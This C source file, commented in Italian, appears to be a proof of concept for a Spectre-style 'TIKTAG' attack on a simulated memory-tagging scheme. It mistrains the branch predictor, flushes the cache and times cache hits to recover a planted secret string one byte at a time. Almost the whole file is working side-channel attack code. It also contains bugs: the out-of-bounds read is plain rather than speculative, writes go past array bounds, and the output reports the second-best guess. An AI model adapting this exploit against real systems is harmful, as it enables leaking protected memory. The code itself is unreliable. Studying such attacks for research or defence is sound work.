#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define NUM_TRAIN 6 // presume un contatore a 2 bit nel predittore
#define NUM_ROUNDS 1 // numero di volte per eseguire la sequenza train + attack (per ridondanza)
#define SAME_ATTACK_ROUNDS 10 // numero di attacchi sullo stesso indice
#define SECRET_LEN 85
#define CACHE_THRESHOLD 50

uint64_t array1_size = 16;
uint8_t padding1[64];
uint8_t array1[160]; // Inizializziamo array1 a zero
uint8_t padding2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretStr = "!\"#ThisIsTheSecretString:)abcdefghijklmnopqrtsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!£$%&?*";

// Simulazione dei tag
uint8_t memory_tags[256];

void findTopTwo(uint64_t* inputArray, uint64_t inputSize, uint8_t* outputIdxArray, uint64_t* outputValArray) {
    outputValArray[0] = 0;
    outputValArray[1] = 0;
    outputIdxArray[0] = 0;
    outputIdxArray[1] = 0;

    for (uint64_t i = 0; i < inputSize; ++i) {
        if (inputArray[i] > outputValArray[0]) {
            outputValArray[1] = outputValArray[0];
            outputValArray[0] = inputArray[i];
            outputIdxArray[1] = outputIdxArray[0];
            outputIdxArray[0] = i;
        } else if (inputArray[i] > outputValArray[1]) {
            outputValArray[1] = inputArray[i];
            outputIdxArray[1] = i;
        }
    }
}

/**
 * Funzione per inizializzare i tag della memoria.
 * Ogni blocco di memoria ha un tag specifico.
 */
void initializeMemoryTags() {
    for (int i = 0; i < 256; ++i) {
        memory_tags[i] = i % 16; // Esempio di assegnazione di tag
    }
}

/**
 * Controlla se il tag del puntatore corrisponde al tag della memoria.
 *
 * @param idx Indice del blocco di memoria.
 * @param ptrTag Tag del puntatore.
 * @return 1 se i tag corrispondono, 0 altrimenti.
 */
int checkMemoryTag(uint64_t idx, uint8_t ptrTag) {
    return memory_tags[idx] == ptrTag;
}

/**
 * Funzione vittima vulnerabile a TIKTAG (simulazione di MTE).
 *
 * @param idx Indice utilizzato per accedere ai dati.
 * @param ptrTag Tag del puntatore per il controllo del tag.
 */
void victimFunction(uint64_t idx, uint8_t ptrTag) {
    uint8_t temp = 0;

    // Verifica del tag (simulazione MTE)
    if (idx < array1_size && checkMemoryTag(idx, ptrTag)) {
        array1[idx] = 0; // Store sicuro
    }

    // Bypass speculativo del controllo del tag
    uint8_t value = array1[idx]; // Accesso speculativo al valore precedente
    
    printf("%c\n", array2[value * L1_BLOCK_SZ_BYTES]);

    // Usa il valore per accedere a array2, causando effetti collaterali nella cache
    temp &= array2[value * L1_BLOCK_SZ_BYTES];
}

int main(void) {
    uint64_t attackIdx = (uint64_t)(secretStr - (char*)array1);
    uint64_t startTime, duration, inputIdx;
    uint8_t temp = 0;
    static uint64_t results[256];

    // Inizializza i tag della memoria
    initializeMemoryTags();

    // Inizializza array1 con i dati segreti
    for (uint64_t i = 0; i < SECRET_LEN; ++i) {
        array1[attackIdx + i] = secretStr[i];
        memory_tags[attackIdx + i] = i % 16; // Assegna un tag ai blocchi di memoria
    }

    // Inizia l'estrazione dei segreti
    for (uint64_t i = 0; i < SECRET_LEN; ++i) {

        // Resetta i risultati
        for (uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        // Ripeti l'attacco
        for (uint64_t round = 0; round < SAME_ATTACK_ROUNDS; ++round) {

            // Svuota array2 dalla cache
            flushCache((uint64_t)array2, sizeof(array2));

            // Allena il branch predictor a prevedere male
            for (uint64_t j = 0; j < NUM_TRAIN; ++j) {
                victimFunction(array1_size + 1, 0xFF); // idx >= array1_size, condizione falsa
            }

            // Chiama victimFunction con idx < array1_size per innescare la mispredizione
            inputIdx = attackIdx + i; // Indice del dato segreto
            victimFunction(inputIdx, 0x00); // Forniamo un tag falso

            // Leggi i risultati
            for (uint64_t m = 0; m < 256; ++m) {
                startTime = rdcycle();
                temp &= array2[m * L1_BLOCK_SZ_BYTES];
                duration = (rdcycle() - startTime);
                
                if (duration < CACHE_THRESHOLD) {
                    results[m] += 1;
                }
            }
        }

        // Trova i due migliori risultati
        uint8_t bestGuess[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuess, bestHits);

        printf("m[0x%p] = atteso(%c) =?= ipotesi(hits,dec,char) 1.(%lu, %d, %c)\n", 
            (uint8_t*)(array1 + attackIdx + i), secretStr[i], bestHits[1], bestGuess[1], bestGuess[1]); 
    }

    return 0;
}

